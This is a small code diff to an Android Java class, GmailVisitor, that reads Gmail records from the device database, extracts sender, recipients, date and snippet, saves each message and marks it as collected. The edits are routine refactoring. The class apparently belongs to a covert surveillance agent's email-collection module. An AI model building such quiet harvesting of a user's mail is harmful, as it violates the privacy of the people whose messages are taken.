@@ -1,4 +1,4 @@
-package com.android.networking.module;
+package com.android.networking.module.email;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -11,7 +11,7 @@ import android.database.Cursor;
 
 import com.android.networking.auto.Cfg;
 import com.android.networking.db.RecordVisitor;
-import com.android.networking.module.email.Email;
+import com.android.networking.module.ModuleMessage;
 import com.android.networking.module.message.Filter;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
@@ -64,7 +64,7 @@ public class GmailVisitor extends RecordVisitor {
 	}
 
 	@Override
-	public int cursor(Cursor cursor) {
+	public long cursor(Cursor cursor) {
 		initialize(cursor);
 		// extract messages
 
@@ -81,7 +81,7 @@ public class GmailVisitor extends RecordVisitor {
 		String body = snippet;
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (cursor), _id=" + id + " from=" + fromAddress + " to= " + toAddresses);
+			Check.log(TAG + " (cursor), _id=" + id + " date= " + timestamp + " from=" + fromAddress + " to= " + toAddresses );
 		}
 
 		try {
@@ -99,7 +99,7 @@ public class GmailVisitor extends RecordVisitor {
 		moduleMessage.saveEmail(m);
 		moduleMessage.updateMarkupMail(mailstore, id, false);
 
-		if(Cfg.ONEMAIL){
+		if(Cfg.ONE_MAIL){
 			stopRequest=true;
 		}
 		return id;
